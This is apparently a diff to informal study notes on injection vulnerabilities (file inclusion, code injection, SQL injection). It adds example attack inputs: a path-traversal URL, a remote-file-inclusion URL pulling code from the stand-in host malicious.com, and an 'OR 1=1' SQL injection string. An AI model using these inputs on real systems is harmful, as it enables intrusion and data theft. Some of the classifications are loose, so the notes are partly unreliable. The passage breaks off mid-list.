@@ -4,10 +4,26 @@
   Note - This type of attack is most probably carried out in application which have the usage of unsanitized user inputs i.e, user inputs which are not validated
 
   -types of vulnerabilities
-    1. CWE-97: Server-side injection - Usage of unsanitized input of an application to retrieve confidential/sensitive data in bulk from the server itself. There are many types of
-        server-side injection techniques. Some of the most notable ones are
+    1. CWE-97: Server-side injection - Usage of unsanitized inputs of an application to retrieve confidential/sensitive data in bulk from the server itself or execute malicious 
+        scripts, commands or code. There are many types of server-side injection techniques. Some of the most notable ones are
 
-        + CWE-98: File inclusion - Using script to execute commands which can be used to include files in the web/application server for potentially remote code execution. There
-          are two types of file inclusion vulnerabilities
+        + CWE-98: File inclusion - Ways of including local or server side files onto the target server to run exploiting scripts or data retrieval scripts
 
-          - 
+          - Local file inclusion - An inclusion vulnerability by which the attacker can include/execute local files on the server of the application/webpage
+            Example - example-website.com/?file=../../uploads/malicious.php
+
+          - Remote file inclusion - Inclusion/execution of malicious code on the server which is retrieved from an external server potentially leading to a complete compromise of 
+            system
+            Example - example.com/index.php?=http://malicious.com/malicious_code.php
+
+        Most of this inclusions are done via path paramaters and is considered a vulnerability related to the backend development as the servers are at fault for not validating
+        the given URL parameter inputs and executing them as it is which are leading to this unwanted execution and potential data breaches
+
+    2. CWE-94: Remote code execution/Code injection - It is the usage of unsanitized inputs to include commands or queries which can retrieve sensitive data or can implement 
+        arbitrary code execution on the target system. Some of the common methods for RCE are
+
+        + CWE-89: SQL injection - In an input widget if we were to give SQL queries and the unsanitized vulnerabilities helps to get by and the execution of this queries can 
+          expose the tables being stored, all the confidential/sensitive information such as usernames and passwords. And if too weak, then even custom queries can be used to 
+          include arbitrary code to exploit this weakness. Example: SELECT * FROM users WHERE username = '' OR 1=1;
+
+        + CWE-91, 611: 
